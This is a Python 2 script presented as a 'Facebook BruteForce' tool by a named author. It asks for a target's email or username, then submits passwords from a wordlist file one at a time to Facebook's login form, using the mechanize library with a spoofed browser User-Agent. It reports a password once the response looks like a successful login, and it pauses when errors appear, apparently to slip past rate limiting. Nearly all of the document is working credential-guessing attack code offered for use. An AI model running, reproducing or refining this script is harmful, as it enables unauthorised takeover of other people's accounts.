import os 
import sys
import time 
from os import system
from time import sleep
import requests


if sys.version_info[0] !=2: 
	print('''--------------------------------------
	REQUIRED PYTHON 2.x
	use: python fb2.py
--------------------------------------
			''')
	sys.exit()
	
#clrnumber

R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
C = '\033[1;36m'
W = '\033[1;37m'

##### LOGO #####
logo = """
\033[1;96m==============================================
\033[1;96m     
\033[1;96m    ____    __  __   ____    _   _
\033[1;92m   / ___|  |  \/  | / ___|  | | | |
\033[1;96m   \___ \  | |\/| | \___ \  | |_| |
\033[1;92m    ___) | | |  | |  ___) | |  _  |
\033[1;96m   |____/  |_|  |_| |____/  |_| |_|
 
\033[1;93m     Facebook : www.facebook.com/smsh.me
\033[1;96m=============================================
"""

#fortextdesign

def hp(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(8.0 / 100)
        
def my():
    system("clear")
    print('')
    hp('')
    print(G + " Hello!I am S M Shakib Hasan ")
    print(logo)
    print('')
    hp(R + ' If you want to do the job.')
    hp(G + ' And if you love your job.' )
    hp(R + ' Then one day you will be successful.')
    hp(C + ' Inshallah.')
    hp(G +  '                  --SMSH')

    print('')
    hp(Y + " Going To next page......")
    sleep(2)
    system("clear")
    
post_url='https://www.facebook.com/login.php'
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

try:
	import mechanize
	import urllib2
	browser = mechanize.Browser()
	browser.addheaders = [('User-Agent',headers['User-Agent'])]
	browser.set_handle_robots(False)
except:
	print('\n\tPlease install mechanize.\n')
	sys.exit()

my()
print('')
print(logo)
print('')
hp(C + "            Facebook BruteForce      ")
print('')
hp(G + "==============> Let's Start <============")
print('')

file=open('46223','r')

emil=str(raw_input('Enter Email/Username : ').strip())
email = emil.lower()

print('')
hp(Y + "Trying Account : " + G + (email))
print
hp(G + "Trying Passwords from list ...")
hp(R + '')
i=0
while file:
	passw=file.readline().strip()
	i+=1
	if len(passw) < 6:
		continue
	print str(i) +" : ",passw
	response = browser.open(post_url)
	try:
		if response.code == 200:
			browser.select_form(nr=0)
			browser.form['email'] = email
			browser.form['pass'] = passw
			response = browser.submit()
			response_data = response.read()
			if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
				hp(G + 'Your password is : ',passw)
				break
	except:
		time.sleep(300)
